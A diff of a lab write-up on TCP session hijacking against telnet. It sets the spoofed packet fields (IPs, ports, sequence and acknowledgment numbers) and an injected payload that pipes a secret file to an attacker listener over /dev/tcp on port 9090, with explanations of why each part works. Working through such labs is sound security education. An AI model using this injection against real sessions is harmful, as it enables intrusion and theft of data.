@@ -49,22 +49,22 @@ This image shows the port numbers, the next sequence number, the acknowledgment 
 ```console
 source_ip = "10.0.2.4"
 destination_ip = "10.0.2.5"
-source_port = 45736
+source_port = 59830
 destination_port = 23
-sequence_num = 1717083005
-acknowledgment_num = 1242665292
+sequence_num = 3366342961
+acknowledgment_num = 4096614496
 ttl_value = 64
 window_size = 501
 tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
 ```
 
-**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the next sequence number is *2523450797*, the acknowledgment number is *311613137*; the source port (in this example) is 45736, the destination port is 23. the tcp window size (in this example) is 501, the time to live (ttl) value is 64. The tcp data we can use is: "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r".
+**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the next sequence number is *3366342961*, the acknowledgment number is *4096614496*; the source port (in this example) is *59830*, the destination port is 23. the tcp window size (in this example) is 501, the time to live (ttl) value is 64. The tcp data we can use is: "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r".
 
 **Explanation**: The telnet command we want to inject is: "cat /home/seed/secret > /dev/tcp/attacker_ip/9090", but we want this command to be sandwiched by two newline signs "\r", so that the command will not be concatenated with other random strings.
 
-**Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address. Thus we come to our next step,
+**Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address.
 
-8. before running the script, the attacker needs to open another terminal window so that the attacker can listen on a port at the attacker's IP address - here we choose port 9090, which matches with what is specified in the python script.
+8. Once the above 9 lines are modified correctly, we are ready to launch the attack, which is just running the python script. Before running the python script, the attacker needs to open another terminal window so that the attacker can listen on a port at the attacker's IP address - here we choose port 9090, which matches with what is specified in the python script.
 
 8.1. Listening in one terminal window:
 ![alt text](lab-tcp-hijack-listening.png "Lab tcp hijacking attack listening on port 9090")
